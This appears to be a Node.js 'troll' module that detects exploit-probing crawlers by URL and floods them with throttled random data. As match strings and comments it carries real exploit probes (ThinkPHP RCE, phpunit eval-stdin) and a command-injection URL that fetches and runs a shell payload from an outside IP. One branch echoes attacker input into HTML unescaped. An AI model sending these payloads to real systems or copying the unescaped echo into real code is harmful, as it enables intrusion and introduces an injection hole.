// fun data for bad web crawlers
/* request urls summary:
 * bad ones:
  - GET  /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
  - GET  /?XDEBUG_SESSION_START=phpstorm
  - POST /api/jsonws/invoke
  - GET  /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
  - POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
  - GET  /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f
 * normal ones:
  - GET  /TP/public/index.php
 */
module.exports = function trollsf(req, res, rrid, ipaddr, proto, url, cookies, nam) {
  if (!datajs.feat.trolls) return;
  if (req.url.startsWith('/?a=fetch&content=')) {
    // apparantly ips will request this type of url to have the server echo back the HTML and PHP given, must be a security vulnerability
    let content = req.url.slice(18, Infinity);
    if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'php execution' });
    console.log('Fetching "content" (may be PHP 😜): ' + content);
    // give them some "content"
    res.writeHead(200, {'Content-Type': 'text/html'});
    res.write(content);
    // then bomdard with 1GiB random data
    res.stream_rand = datajs.s.randomStream();
    res.stream_rand.pipe(res.stream_throttle = new datajs.Throttle({bps: 2 ** 20}));
    res.stream_throttle.pipe(res);
    res.stream_rand.on('end', () => console.log('finished with php content return'));
    res.stream_rand.on('close', () => console.log('php content return closed'));
    res.stream_rand.on('error', () => console.log('error in php content return'));
    return 1;
  } else if (req.url == '/?XDEBUG_SESSION_START=phpstorm') {
    // php storm debugging session
    let data = [];
    req.on('data', c => data.push(c));
    req.on('end', () => {
      data = Buffer.concat(data);
      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'phpstorm' });
      console.log('Someone wants to debug (phpstorm)');
      console.log(data);
      console.log(util.inspect(data.toString()));
      // bomdard with 1GiB random data
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.stream_rand = datajs.s.randomStream();
      res.stream_rand.pipe(res.stream_throttle = new datajs.Throttle({bps: 2 ** 20}));
      res.stream_throttle.pipe(res);
      res.stream_rand.on('end', () => console.log('finished with phpstorm'));
      res.stream_rand.on('close', () => console.log('phpstorm closed'));
      res.stream_rand.on('error', () => console.log('error in phpstorm'));
    });
    return 1;
  } else if (req.url == '/api/jsonws/invoke') {
    // client wants some json web services data
    let data = [];
    req.on('data', c => data.push(c));
    req.on('end', () => {
      data = Buffer.concat(data).toString();
      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'jsonws invoke' });
      console.log('Getting JSON data 😜 (jsonws invoke)');
      console.log(util.inspect(data));
      // gives client 512MiB+ garbage data
      res.writeHead(200, {'Content-Type': 'application/json'});
      res.stream_jsonrand = datajs.s.defaultJSONRandStream();
      res.stream_jsonrand.pipe(res.stream_throttle = new datajs.Throttle({bps: 2 ** 20}));
      res.stream_throttle.pipe(res);
      res.stream_jsonrand.on('end', () => console.log('wrote json data'));
      res.stream_jsonrand.on('close', () => console.log('closed writing of json data'));
      res.stream_jsonrand.on('error', () => console.log('error in writing json data'));
    });
    return 1;
  } else if (req.url == '/solr/admin/info/system?wt=json') {
    // client wants some solr admin json data
    let data = [];
    req.on('data', c => data.push(c));
    req.on('end', () => {
      data = Buffer.concat(data).toString();
      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'solr admin info' });
      console.log('Getting admin JSON data 😜 (solr admin info)');
      console.log(util.inspect(data));
      // gives client 512MiB+ garbage data
      res.writeHead(200, {'Content-Type': 'application/json'});
      res.stream_jsonrand = datajs.s.defaultJSONRandStream();
      res.stream_jsonrand.pipe(res.stream_throttle = new datajs.Throttle({bps: 2 ** 20}));
      res.stream_throttle.pipe(res);
      res.stream_jsonrand.on('end', () => console.log('wrote admin json data'));
      res.stream_jsonrand.on('close', () => console.log('closed writing of admin json data'));
      res.stream_jsonrand.on('error', () => console.log('error in writing admin json data'));
    });
    return 1;
  } else if (req.url == '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php') {
    // anything sent as request body is executed by vulnerable php servers
    let data = [];
    req.on('data', c => data.push(c));
    req.on('end', () => {
      data = Buffer.concat(data);
      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'phpunit eval-stdin' });
      console.log('Someone wants to execute some code (phpunit eval-stdin)');
      console.log(data);
      console.log(util.inspect(data.toString()));
      // bomdard with 1GiB random data
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.stream_rand = datajs.s.randomStream();
      res.stream_rand.pipe(res.stream_throttle = new datajs.Throttle({bps: 2 ** 20}));
      res.stream_throttle.pipe(res);
      res.stream_rand.on('end', () => console.log('finished with eval return'));
      res.stream_rand.on('close', () => console.log('eval return closed'));
      res.stream_rand.on('error', () => console.log('error in eval return'));
    });
    return 1;
  } else if (req.url == '/w00tw00t.at.blackhats.romanian.anti-sec:)') {
    // WOOT WOOT!!!
    let data = [];
    req.on('data', c => data.push(c));
    req.on('end', () => {
      data = Buffer.concat(data);
      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'w00t w00t' });
      console.log('Someone wants to WOOT WOOT (w00tw00t)');
      console.log(data);
      console.log(util.inspect(data.toString()));
      // bomdard with 1GiB random data
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.stream_rand = datajs.s.randomStream();
      res.stream_rand.pipe(res.stream_throttle = new datajs.Throttle({bps: 2 ** 20}));
      res.stream_throttle.pipe(res);
      res.stream_rand.on('end', () => console.log('finished with w00tw00t'));
      res.stream_rand.on('close', () => console.log('w00tw00t closed'));
      res.stream_rand.on('error', () => console.log('error in w00tw00t'));
    });
    return 1;
  } else if (req.url == '/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22') {
    let data = [];
    req.on('data', c => data.push(c));
    req.on('end', () => {
      data = Buffer.concat(data);
      if (datajs.feat.notify) notifier.notify({ title: 'Troll Underway', message: 'cgi-bin' });
      console.log('Someone wants to cgi-bin');
      console.log(data);
      console.log(util.inspect(data.toString()));
      // bomdard with 1GiB random data
      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.stream_rand = datajs.s.randomStream();
      res.stream_rand.pipe(res.stream_throttle = new datajs.Throttle({bps: 2 ** 20}));
      res.stream_throttle.pipe(res);
      res.stream_rand.on('end', () => console.log('finished with kerbynet'));
      res.stream_rand.on('close', () => console.log('kerbynet closed'));
      res.stream_rand.on('error', () => console.log('error in kerbynet'));
    });
  }
};